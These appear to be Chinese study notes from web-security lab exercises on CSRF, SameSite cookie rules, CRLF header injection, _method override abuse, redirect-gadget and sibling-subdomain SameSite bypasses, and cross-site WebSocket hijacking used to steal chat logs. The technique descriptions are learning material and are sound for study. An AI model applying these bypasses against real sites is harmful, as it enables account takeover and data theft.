0x00.基础知识

  1. 什么是CSRF？
    跨站请求伪造（Cross-Site Request Forgery，简称 CSRF），是一种利用用户已登录的身份，在用户不知情的情况下，诱导其在第三方页面发起伪造请求，从而执行非预期操作（如改密码、转账、修改信息）的漏洞。即攻击者不偷你的账号密码，不读你的 Cookie，只是让你的浏览器 “带着你的身份，替你干坏事”。

  2. 漏洞由来：HTTP 无状态与 Cookie 的设计初衷

    • HTTP 协议本身是无状态的：每次请求都是独立的，网站无法直接识别用户身份。
    • 为了实现 “免重复登录”，诞生了Cookie + Session机制：用户登录后，网站会在浏览器中写入 Cookie，后续每次访问该网站，浏览器都会自动带上对应域名的 Cookie，网站通过 Cookie 识别用户身份。
    • 漏洞的根源：浏览器的 “自动带 Cookie” 机制，被跨站请求滥用 —— 第三方恶意页面发起的请求，浏览器依然会自动带上目标网站的 Cookie，网站无法区分请求是用户主动发起，还是被伪造的。

  3. CSRF 攻击的 3 个必备条件

    • 用户处于目标网站的有效登录状态（浏览器存有合法的会话 Cookie）；
    • 目标网站的敏感操作接口，仅依赖 Cookie 做身份校验，没有额外的请求合法性校验；
    • 浏览器允许跨站发起请求，并自动携带目标网站的 Cookie（这是浏览器的原生行为）。

对于cookie的字段认识
Cookie 所有标准字段完整对照表

字段名称 示例值 详细作用
Name=Value user_session=7s9k2p6d8f1g Cookie 核心主体，以键值对形式存储用户会话、身份标识、临时配置等数据，是网站识别用户的核心凭证。
Domain example.com 规定该 Cookie 归属的域名，默认是当前请求域名；设置后所有子域名都能携带、访问该 Cookie。
Path /admin 限制 Cookie 生效的网站路径，只有访问域名下该路径及子路径时，浏览器才会携带此 Cookie。
Expires Fri, 31 Dec 2026 23:59:59 GMT 绝对过期时间，设置固定日期时间；到达时间后浏览器自动删除该 Cookie，用于持久型 Cookie。
Max-Age 86400 相对过期时间，单位秒；从设置时刻开始倒计时，超时自动删除，优先级高于 Expires。
HttpOnly 无值（仅标记） 禁止前端 JavaScript 通过 document.cookie 读取和操作该 Cookie，防止 XSS 攻击窃取会话凭证。
Secure 无值（仅标记） 该 Cookie 仅在 HTTPS 加密请求中携带，HTTP 明文请求不会发送，避免中间人抓包窃取。
SameSite Strict / Lax / None 管控跨站请求时是否自动携带 Cookie，用来规范浏览器跨域身份凭证的发送行为。
Priority High / Medium / Low 浏览器存储空间不足时，按优先级淘汰 Cookie；高优先级最后被清理，保证重要会话 Cookie 留存。
Partitioned 无值（仅标记） 隔离第三方 Cookie，采用分区存储，防止跨网站追踪用户行为，适配现代浏览器隐私策略。
  • SameSite=Strict（比如 hook_slardar_session_id）：
    浏览器完全禁止跨站请求携带这个 Cookie。也就是说，只要请求是从其他域名发起的（比如恶意页面），浏览器绝不会带上这个 Cookie，直接防御 CSRF。
  • SameSite=None（比如 passport_csrf_token、ssid_ucp_v1）：
    浏览器不限制跨站携带，任何跨站请求（POST 表单、AJAX、GET 跳转）都会自动带上 Cookie。这是 CSRF 风险最高的设置，而且必须搭配 Secure 属性（截图里这些 Cookie 都同时开了 Secure，符合规范）。
  • 无显式设置（默认 Lax）（截图里大部分 Cookie 没标 SameSite，Chrome 80+ 默认值）：
    宽松限制：仅在「跨站顶级导航的 GET 请求」中携带 Cookie（比如点击恶意链接跳转到目标网站），跨站 POST 表单、AJAX 请求不会携带。
    这意味着：如果靶场的敏感操作是 GET 请求，Lax Cookie 依然能被 CSRF 利用；如果是 POST 请求，跨站表单就带不上 Cookie，攻击会失败。

在现在的网页中，网站会在用户会话中生成一个随机 Token，存在 Cookie 里，同时在表单 / 请求参数里也会带上这个 Token，提交请求时服务器会比对两者是否一致，直接防御 CSRF。

CRLF注入

CRLF 本质就是回车换行符，在 URL 中用 %0d%0a 编码表示。靶场搜索接口存在缺陷，没有对用户输入的换行字符做过滤，会直接把 search 参数的内容拼接进 HTTP 响应头里。我们利用 %0d%0a 实现响应头换行截断，在换行后自行拼接 Set-Cookie 指令，相当于借用靶场自身服务器，主动向浏览器下发写入 csrfKey 的命令。浏览器的同源策略只会拦截第三方恶意网页跨域私自设置靶场 Cookie，但会完全信任靶场官方服务器返回的响应头指令，直接无条件种下我们指定的 csrfKey。以此绕过浏览器同源拦截，给受害者浏览器植入攻击者的 csrfKey，再搭配配对的 csrf 令牌，就能自动完成篡改受害者邮箱的 CSRF 攻击

SameSite Lax

SameSite 设计初衷是什么？
不能再无脑随便带 Cookie 了，浏览器要自己帮用户做一层安全防护

  • 从浏览器层面，默认拦截大部分 CSRF 攻击，不用全靠程序员手写防护；
  • 给 Cookie 加规则：明确规定「跨站请求能不能带 Cookie」；
  • 平衡安全和正常业务：不能太粗暴把正常网页跳转、第三方登录、点赞链接全搞崩

三种模式：

  • Strict 最严
  • Lax 宽松 （现在所有浏览器默认都是它）
  • None 完全不限制

SameSite 不是同源策略（SOP）的组成部分,它是浏览器另外单独设计的一套独立安全规则，和同源策略是平行、互补关系，不是包含关系

SameSite=Lax 规则：跨站顶级页面跳转的 GET 请求 会自动携带会话 Cookie

  1. 什么是「跨站」？

    • 跨域：指 协议、域名、端口 任意一个不同，比如 http://a.com 和 https://a.com（协议不同）、a.com 和 api.a.com（子域名不同）。
    • 跨站：只看「一级域名」，比如 evil.com 和 web-security-academy.net 是跨站；但 web-security-academy.net 和 sub.web-security-academy.net 是同站。
    • 跨站是跨域的子集

  2. 什么是「顶级页面跳转」？
    就是浏览器的地址栏直接发生变化

    • 点击链接 <a href="https://target.com">
    • 用 document.location = “https://target.com“ 跳转
    • 特点：浏览器会加载一个全新的页面，原来的页面会被替换

  3. 什么是「非顶级页面跳转」？

    • 用 <iframe> 加载另一个网站的内容
    • 用 fetch/XMLHttpRequest 发送 AJAX 请求
    • 图片、CSS、JS 等静态资源的跨站加载

总结：SameSite=Lax 就是：

  • ✅ 只有 跨站 + 顶级导航 + GET 请求 → 会自动带 Cookie
  • ❌ 跨站 POST 请求（不管是表单、AJAX）→ 绝对不带 Cookie

发 POST 请求，带参数 _method=PUT，后端就把这个请求当成 PUT 处理。
属于是行业通用历史遗留设计

真实场景里怎么变成漏洞的？

框架开了 _method 方法伪造功能，没关闭；
接口只校验「请求方法」，没校验禁止 GET 执行敏感操作。
后果：

接口本意：只允许 POST 改邮箱
攻击者：发 GET /change-email?_method=POST
框架自动把 GET 强行解析成 POST
后端方法校验通过，执行改邮箱

你可以使用以下账号密码登录自己的账户：用户名：wiener 密码：peter
你无法注册已经被其他用户占用的邮箱地址。如果你在测试攻击载荷的过程中改动了自己的邮箱，请务必在发给受害者的最终攻击载荷里使用一个不一样的邮箱地址

抓取邮箱更新的数据包：请求里没有任何随机 Token、验证码，无 CSRF 防护

SameSite=Strict 铁规则
只要是跨站发起的请求，浏览器任何情况都不携带会话 Cookie，普通 document.location、a 标签跨站跳转全部失效。

特性 Strict Lax
严格程度 最高 中等
跨站普通跳转 一律不带Cookie 顶级GET导航带Cookie
跨站POST/AJAX/iframe 不带Cookie 不带Cookie
同站内部跳转 带Cookie 带Cookie
能否直接跨站location.href攻击 不能 能

只要最初是别的跨站网站发起、指挥的请求，浏览器一律不携带本站 Cookie。

浏览器底层判定核心

  • Strict 不永久追溯最初源头，只看当前请求的直接发起者；
  • 外部跨站网站直接指挥的请求 → 一律不带 Cookie；
  • 一旦进入目标网站页面，由网站自身页面 JS 发起的跳转，属于站内自发行为 → 正常携带 Cookie；
  • 不追究你最开始是不是从恶意网站进来，只看现在是谁在发请求。

关于重定向

服务器 302 重定向（服务端跳转）

定义:

你浏览器发一个请求给 网站服务器，服务器不返回正常网页内容，而是返回一个 302 状态码 + 新的 URL 地址。
浏览器收到 302 后，自动再发一次请求访问新 URL。

特点：

跳转逻辑由服务器控制
浏览器全程知道：整个行为是外部跨站触发的一连串请求
两次请求都被标记为：源自跨站

客户端 JS 重定向（前端页面跳转）

定义:

浏览器访问一个正常网页，服务器返回完整 HTML 页面，页面里自带一段 JavaScript 代码。代码里写好了：过几秒自动跳转到另一个地址。
和服务器没关系，是浏览器本地执行 JS 自己跳的。

特点：

跳转逻辑写在页面 JS 里，由浏览器本地执行
第二步跳转，是进入网站页面后，网站自己的页面发起的
浏览器视角：我已经在本站页面里了，是站内正常浏览跳转

恶意利用的例子：

第一步

恶意外部网站 → 指挥浏览器打开 目标网站某个页面
直接发起者：外部网站
Strict 判定：跨站 → 不带 Cookie
但结果：浏览器成功载入了目标网站的页面

第二步

目标网站这个页面，里面自带 JS，自己自动跳转去另一个地址
直接发起者：目标网站的页面 JS
和最开始的恶意外部网站 已经没有任何控制关系
Strict 判定：站内自发行为 → 带 Cookie

由这个利用过程可知：我们需要在目标网站中寻找一个自带客户端 JS 自动跳转、且参数可控的页面作为跳板（Gadget），先跨站载入该页面，再依靠页面自身的 JS 完成站内跳转，从而绕过 SameSite=Strict 限制携带会话 Cookie。

0x09.通过同级子域名绕过 SameSite Strict 策略

本实验室的在线聊天功能存在跨站 WebSocket 劫持（CSWSH*漏洞。通关目标：登录受害者的账户。
任务要求：利用平台提供的漏洞攻击服务器，发起跨站 WebSocket 劫持（CSWSH）攻击，将受害者的聊天记录窃取到 Burp 默认协作服务器。聊天记录中包含明文形式的登录账号密码。

提示：

  • 务必完整审计所有可利用的攻击面；
  • 留意能辅助实施攻击的其他漏洞；
  • 牢记核心关键点：两个不同的子域名，有可能归属同一个「站点（Site）」（契合 SameSite 同站判定规则）。

CSWSH漏洞

CSWSH 的全称是 Cross-Site WebSocket Hijacking，中文译为跨站 WebSocket 劫持。 其本质上可以看作是 针对 WebSocket 的 CSRF（跨站请求伪造）攻击

  1. WebSocket的简析

    WebSocket 是一种在单个 TCP 连接上进行全双工（双向）实时通信的协议，常用于实时聊天、股票行情、在线游戏等场景。
    当客户端（浏览器）通过 JavaScript 发起 WebSocket 连接（例如使用 new WebSocket(‘wss://…’)）时，浏览器会自动在 HTTP 握手请求中携带目标域名的 Cookie（包括用于身份验证的 Session Cookie）。

  2. WebSocket 的握手请求有标志性字段

  1. WebSocket的安全问题

核心问题：WebSocket 没有 CORS 保护！
普通 HTTP 请求有 CORS（跨域资源共享）机制——浏览器会检查服务器是否允许来自其他网站的请求。
但 WebSocket 没有这个机制！如果服务器不主动检查 Origin 头，任何网站都能建立 WebSocket连接，而且浏览器会自动带上受害者的 Cookie！

这就是 CSWSH（Cross-Site WebSocket Hijacking，跨站 WebSocket 劫持） 的原理。
CSWSH比普通的CSRF危害更大，因为WebSocket 是持久化的双向连接。一旦连接建立，攻击者不仅可以代表受害者向服务器发送指令（执行操作），还可以实时接收并读取服务器推送的敏感数据（如本实验中的聊天记录、私人通知等)

值 含义 跨站请求时是否带 Cookie
None 不限制 ✅ 总是带
Lax 宽松 ✅ 仅顶级导航（点击链接）带，❌ AJAX/WebSocket 不带
Strict 严格 ❌ 任何跨站请求都不带
